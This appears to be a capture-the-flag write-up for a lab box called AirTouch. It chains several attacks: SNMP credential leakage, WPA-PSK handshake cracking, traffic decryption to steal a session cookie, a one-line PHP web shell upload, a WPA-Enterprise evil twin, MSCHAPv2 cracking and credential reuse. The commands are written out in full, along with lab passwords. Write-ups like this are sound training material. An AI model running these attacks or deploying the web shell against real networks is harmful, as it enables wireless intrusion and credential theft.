---
title: "AirTouch"
date: 2026-03-06
draft: false
tags: ["linux", "wifi", "docker", "medium"]
categories: ["writeups"]
summary: ""
params:
  box:
    os: "Linux"
    difficulty: "Medium"
ShowToc: true
protected: true
---

# AirTouch

AirTouch is a medium-difficulty Linux box that takes you on a multi-hop wireless exploitation journey across three network segments. You'll crack WPA-PSK handshakes, capture and decrypt WiFi traffic to steal session cookies, run a WPA-Enterprise evil twin attack with real CA certificates, and crack MSCHAPv2 credentials to pivot into a corporate VLAN — all from a Docker container with seven simulated wireless interfaces.

---

## Overview

The attack chain looks like this:

1. **SNMP enumeration** leaks SSH credentials → initial foothold in a Docker container on the Consultant VLAN (172.20.1.0/24)
2. **WPA-PSK crack** on AirTouch-Internet → pivot to Tablets VLAN (192.168.3.0/24)
3. **Traffic decryption + cookie theft** → admin access to a router web panel → RCE → user flag
4. **Router loot** yields real RADIUS CA/server certs
5. **WPA-Enterprise evil twin** with real certs on 5 GHz → MSCHAPv2 capture → crack credentials
6. **WPA-Enterprise client connection** to AirTouch-Office → Corp VLAN (<VPN_IP>/24)
7. **World-readable EAP user database** on AP management host → admin SSH → root flag

<div id="protected-marker"></div>

---

## Reconnaissance

### Port Scanning

With a fresh target, I always start with a full TCP scan followed by a UDP scan of common ports. TCP comes back lean:

![terminal output](terminal_01.png)

Only SSH. Not much to work with on its own, but UDP tells a different story:

![terminal output](terminal_02.png)

Port 161 open — SNMP is worth enumerating aggressively before moving on.

### SNMP Enumeration

I used `snmpwalk` with the default `public` community string against SNMPv2c:

```bash
snmpwalk -v2c -c public <TARGET>
```

The very first OID — `sysDescr` — hands us credentials:

![terminal output](terminal_03.png)

Whoever set this up left a credential in the system description field — a classic misconfiguration. Let's try it:

```bash
ssh consultant@<TARGET>
# Password: RxBlZhLmOkacNWScmZ6D
```

It works.

### Initial Foothold Enumeration

Inside the shell, a few things become immediately clear. First, `sudo -l` shows the account has `NOPASSWD: ALL` — unrestricted sudo. Second, the hostname is `AirTouch-Consultant` and the IP is `172.20.1.2/24`, confirming we're in a Docker container, not on the host itself. There's no `user.txt` here — flags live on other machines in the network.

More importantly, there's a `~/diagram-net.png` that maps out the full network:

| VLAN | Subnet | SSID | Hosts |
|------|--------|------|-------|
| Consultant | 172.20.1.0/24 | (wired) | Us |
| Tablets | 192.168.3.0/24 | AirTouch-Internet | Tablet manager |
| Corp | <VPN_IP>/24 | AirTouch-Office | Corporate computer |

The container also has seven simulated wireless interfaces (`wlan0`–`wlan6`) backed by `mac80211_hwsim`, plus tools: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`, `wpa_supplicant`, and `eaphammer`.

### WiFi Scan

Let me see what's in the air. I put `wlan0` into monitor mode and start `airodump-ng`:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

![terminal output](terminal_04.png)

The key observation: **AirTouch-Office has no visible AP**, but three clients are actively probing for it. That's an evil twin target. First though, I need to crack AirTouch-Internet to reach the Tablets VLAN.

---

## Foothold

### Cracking AirTouch-Internet (WPA-PSK)

I'll dedicate interfaces carefully to avoid conflicts. `wlan0mon` stays on passive monitoring, `wlan2` handles deauth, and `wlan3` will be the client connection later.

Lock `wlan0mon` and `wlan2mon` to channel 6 where AirTouch-Internet lives, then deauth the connected client to force a WPA handshake:

```bash
# Capture handshake on wlan0mon
sudo airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 -w /tmp/airtouch wlan0mon &

# Deauth the client
sudo airmon-ng start wlan2
sudo aireplay-ng --deauth 5 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan2mon
```

Handshake captured. Now crack it:

```bash
sudo aircrack-ng /tmp/airtouch-01.cap -w /usr/share/wordlists/rockyou.txt
```

Two seconds later: **PSK = `challenge`**. 

Connect `wlan3` to AirTouch-Internet and grab an IP:

```bash
wpa_passphrase 'AirTouch-Internet' 'challenge' > /tmp/internet.conf
sudo wpa_supplicant -B -i wlan3 -c /tmp/internet.conf
sudo dhclient wlan3
# Got: 192.168.3.46/24, gateway 192.168.3.1
```

### Decrypting Traffic and Stealing a Session Cookie

Now that I'm on the Tablets VLAN, I want to know what the tablet manager is doing. I re-run the capture but this time I'm *already associated*, so I do a combined deauth + capture to get both the handshake and post-handshake data in a single file:

```bash
sudo airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 -w /tmp/tablet_traffic wlan0mon &
sudo aireplay-ng --deauth 3 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan2mon
# Wait 60 seconds, then stop capture
```

`airdecap-ng` needs the handshake and the data frames in the same capture file. With both present:

```bash
airdecap-ng -e 'AirTouch-Internet' -p 'challenge' /tmp/tablet_traffic-01.cap
```

120 packets decrypted. Opening the output in Wireshark, I can see the tablet manager making repeated `GET /lab.php` requests to `192.168.3.1` with a session cookie. I grab it:

```
PHPSESSID=sicb3nc5k8itf2qli2p48gkhno
```

Navigating to `http://192.168.3.1` in a browser (using the cookie) shows a "PSK Router Configuration" panel. The `UserRole` cookie is set to `user`. Changing it to `admin` reveals a file upload form — classic IDOR privilege escalation on a web panel.

PHP and `.php` extensions are blocked, but `.phtml` slips through and executes:

```bash
# shell.phtml contents
<?php system($_GET['cmd']); ?>
```

Upload succeeds. I now have RCE as `www-data` at `http://192.168.3.1/uploads/shell.phtml?cmd=id`.

### Router Enumeration and Privesc

Digging around in the web application source, `login.php` contains hardcoded credentials:

```php
// manager:2wLFYNh4TSTgA5sNgT4  role=user
// user:JunDRDZKHDnpkpDDvay  role=admin  (commented out)
```

The commented-out `user` account with its password still works at the system level:

```bash
su user
# Password: JunDRDZKHDnpkpDDvay
sudo -l
# (ALL) NOPASSWD: ALL
sudo cat /root/user.txt
```

**User flag captured.**

---

## Privilege Escalation

### Looting the Router

With root access on the router, `/root/` reveals everything needed for the next phase:

**`/root/certs-backup/`** — The real TLS certificates for AirTouch-Office's RADIUS server: `ca.crt`, `server.crt`, and `server.key`. These are signed by "AirTouch CA" (CN=AirTouch CA, O=AirTouch, ES) — exactly what the PEAP clients are validating against.

**`/root/send_certs.sh`** — A script that SCPs certs to `<VPN_IP>` using credentials `remote:xGgWEwqUpfoOVsLeROeG`. The router can't reach `<VPN_IP>` directly (no route to Corp VLAN), but now I have credentials for when I get there.

**`/root/psk/hostapd_*.conf`** — PSK passwords for all the neighbor SSIDs (unused for this path, but good to have).

I SCP the certs back to the Consultant container:

```bash
# From Consultant, two-hop through router using ProxyCommand
scp -o ProxyCommand="sshpass -p 'JunDRDZKHDnpkpDDvay' ssh -W %h:%p user@192.168.3.1" \
    user@192.168.3.1:/root/certs-backup/* /tmp/
```

### Evil Twin with Real Certificates (AirTouch-Office)

This is where things get tricky. My first evil twin attempt ran eaphammer on channel 6 (2.4 GHz) — same channel where I'd seen the probes. Clients probed, I sent probe responses, but nobody associated. No auth frames at all.

The problem: I'd been watching 2.4 GHz probes from clients doing background scanning. The *real* AirTouch-Office APs are on **5 GHz channel 44**. A broader scan reveals them:

```
AC:8B:A9:F3:A1:13  CH44  WPA2/CCMP/MGT  AirTouch-Office
AC:8B:A9:AA:3F:D2  CH44  WPA2/CCMP/MGT  AirTouch-Office
```

**Lesson: always scan all channels, including 5 GHz, before assuming where the real AP lives.**

I also hit a problem with eaphammer itself — the Python wrapper failed silently and clients weren't associating even when I fixed the channel. Running the `hostapd-eaphammer` binary directly (with a hand-crafted config) resolved it. For the evil twin, the cert setup requires the `fullchain.pem` to be ordered as: `server.crt` + `ca.crt`, then `server.key` appended or provided separately.

I set up the evil twin on channel 44 with 802.11a hardware mode, and simultaneously deauth clients from the real APs:

```bash
# Evil twin on wlan6, 5GHz channel 44
sudo bash -c 'cd /root/eaphammer && ./eaphammer --creds -i wlan6 \
    -e AirTouch-Office -c 44 --hw-mode a --auth wpa-eap'

# Deauth from real APs on a monitor interface also locked to ch44
sudo airmon-ng start wlan2 44
sudo aireplay-ng --deauth 0 -a AC:8B:A9:F3:A1:13 wlan2mon
```

This time, clients associate and complete PEAP authentication — but now they accept our cert (it's signed by the real CA), and we capture the inner MSCHAPv2 exchange:

![terminal output](terminal_05.png)

### Cracking MSCHAPv2

Hashcat mode 5500 handles NetNTLMv1/MSCHAPv2. The format is `user::::NT_response:challenge` (colons removed from the hex strings):

```bash
echo 'r4ulcl::::59f357436c5ae81e3a36d1f4fd62377ba53d341c4619185f:6d9916cec3f79130' > mschapv2.hash
hashcat -m 5500 mschapv2.hash /usr/share/wordlists/rockyou.txt
```

Instant crack: **`r4ulcl:laboratory`**

### Connecting to the Corp VLAN

Now I need to actually authenticate to AirTouch-Office as `r4ulcl` using `wpa_supplicant`. There's a critical gotcha here that cost me significant time.

**wpa_supplicant does not process backslash escape sequences in quoted strings.** The domain prefix for the identity needs to be `AirTouch\r4ulcl` — a literal backslash followed by the username. If you write `identity="AirTouch\\r4ulcl"` in the config, wpa_supplicant sends the string with *two* backslashes. The RADIUS server rejects it immediately with an EAP-Failure before even sending a challenge.

The correct config:

```
network={
    ssid="AirTouch-Office"
    scan_ssid=1
    scan_freq=5220
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    ca_cert="/tmp/at_ca.crt"
    phase2="auth=MSCHAPV2"
}
```

I also spoof the MAC to match a known client to avoid any MAC filtering:

```bash
sudo ip link set wlan4 down
sudo ip link set wlan4 address 28:6C:07:12:EE:A1
sudo ip link set wlan4 up
sudo wpa_supplicant -B -i wlan4 -c /tmp/office_eap.conf
# DHCP is slow over the WiFi bridge — use a static IP
sudo ip addr add <VPN_IP>/24 dev wlan4
```

Connected to the Corp VLAN. ARP shows `<VPN_IP>` belongs to `AC:8B:A9:AA:3F:D2` — the AP management host. SSH with the credentials from the router script:

```bash
ssh remote@<VPN_IP>
# Password: xGgWEwqUpfoOVsLeROeG
```

We're in — another Docker container, `AirTouch-AP-MGT`.

### AP Management Host Privesc (remote → admin → root)

`remote` has no sudo, and `/root/mgt/` (where the live hostapd configs live) is unreadable. But the *template* configs in `/etc/hostapd/` are world-readable. Inside the EAP user database:

```bash
cat /etc/hostapd/hostapd_wpe.eap_user
```

![terminal output](terminal_06.png)

Plaintext credentials in a world-readable config file. The `admin` EAP password doubles as the SSH password — password reuse:

```bash
ssh admin@<VPN_IP>
# Password: xMJpzXt4D9ouMuL3JJsMriF7KZozm7
sudo cat /root/root.txt
```

**Root flag captured.**

---

## Lessons Learned

**Always scan 5 GHz before setting up an evil twin.** I lost time running eaphammer on channel 6 because that's where I saw probe requests. Background scanning clients probe on multiple bands — the real AP was on 5 GHz channel 44. A full airodump-ng scan covering both bands would have caught this immediately.

**eaphammer's Python wrapper can fail silently.** If clients probe but never associate, try invoking `hostapd-eaphammer` directly with a hand-crafted config. The wrapper has state machine issues in some versions that cause silent failures.

**wpa_supplicant treats quoted strings literally — no backslash processing.** `identity="DOMAIN\\user"` sends two backslashes. `identity="DOMAIN\user"` sends one, which is what RADIUS expects for domain-prefixed usernames. Always transfer config files via base64 encoding to prevent shell escaping from silently mangling your credentials.

**airdecap-ng requires the handshake and data frames in the same capture file.** Capture after a deauth to ensure the handshake is present, then decrypt the whole file in one shot.

**Check `/etc/` for template configs when `/root/` is inaccessible.** Hostapd EAP user databases with plaintext passwords are often world-readable in these configurations — they're template/backup files that operators forgot to lock down.

**Channel isolation in mac80211_hwsim is strict.** Simulated interfaces only relay frames between radios on the same channel. Once an interface has been used as an AP in a hwsim environment, it may accumulate "spurious class3" errors and become unusable — plan your interface allocation upfront and don't reuse them.

**Cookie manipulation is still a thing.** Changing `UserRole=user` to `UserRole=admin` in a cookie bypassed the entire authorization model on the router web panel. Always check what roles are being enforced client-side versus server-side.
